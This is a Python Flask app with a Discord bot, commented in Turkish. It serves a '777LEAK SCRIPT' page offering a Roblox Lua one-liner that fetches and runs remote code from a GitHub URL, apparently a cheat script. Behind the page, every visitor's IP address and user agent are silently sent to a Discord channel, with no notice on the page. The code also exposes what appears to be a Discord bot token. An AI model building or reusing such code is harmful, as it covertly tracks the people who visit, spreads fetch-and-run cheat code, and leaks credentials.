import os
import discord
from flask import Flask, render_template_string, request
from threading import Thread
from datetime import datetime
import asyncio

# Flask Kurulumu
app = Flask(__name__)

# --- AYARLAR ---
# Buraya kendi scriptini koy
MEMO_CODE = """--[[ 777LEAK SCRIPT AKTIF ]]
loadstring(game:HttpGet('https://raw.githubusercontent.com/Documantation12/Universal-Vehicle-Script/main/Main.lua'))()"""

TOKEN = os.environ.get("MTQ3NTAyNDQyNDU4NjcwNzA0OA.GKvfaI.kcL106RBznIOPavWk83f2G071FDmF7dNQxaAfQ")
CHANNEL_ID = os.environ.get("1482480922959024211")

# Discord Bot Kurulumu
intents = discord.Intents.default()
client = discord.Client(intents=intents)

# Log Gönderme Fonksiyonu
async def send_log(ip, ua):
    try:
        channel = await client.fetch_channel(int(CHANNEL_ID))
        embed = discord.Embed(title="🌐 Yeni Giriş: 777LEAK", color=0xbf00ff)
        embed.add_field(name="IP Adresi", value=f"`{ip}`", inline=False)
        embed.add_field(name="Cihaz/Tarayıcı", value=f"```text\n{ua}\n```", inline=False)
        embed.set_footer(text=f"Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        await channel.send(embed=embed)
    except Exception as e:
        print(f"Discord Hatası: {e}")

# Web Arayüzü (Python içinde gömülü HTML)
@app.route('/')
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ua = request.headers.get('User-Agent')
    
    # Bot aktifse log gönder
    if client.is_ready():
        client.loop.create_task(send_log(ip, ua))
    
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>777Leak</title>
        <style>
            body { background: #050505; color: #ff00ff; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
            .box { padding: 30px; border: 2px solid #8a2be2; box-shadow: 0 0 20px #8a2be2; background: #000; border-radius: 10px; width: 80%; max-width: 700px; position: relative; }
            h1 { text-shadow: 0 0 10px #fff; color: #fff; letter-spacing: 5px; }
            pre { background: #111; padding: 15px; overflow-x: auto; border: 1px solid #333; color: #00ff00; }
            .btn { position: absolute; top: 10px; right: 10px; background: #8a2be2; color: #fff; border: none; padding: 10px; cursor: pointer; border-radius: 5px; font-weight: bold; }
        </style>
    </head>
    <body>
        <h1>777LEAK SCRIPT</h1>
        <div class="box">
            <button class="btn" onclick="copy()">KOPYALA</button>
            <pre id="code">{{ code }}</pre>
        </div>
        <script>
            function copy() {
                var text = document.getElementById('code').innerText;
                navigator.clipboard.writeText(text);
                alert('Kod Kopyalandı!');
            }
        </script>
    </body>
    </html>
    """, code=MEMO_CODE)

# Botu Ayrı İşlemde Çalıştır
def run_discord():
    client.run(TOKEN)

if __name__ == "__main__":
    if TOKEN and CHANNEL_ID:
        Thread(target=run_discord).start()
    
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
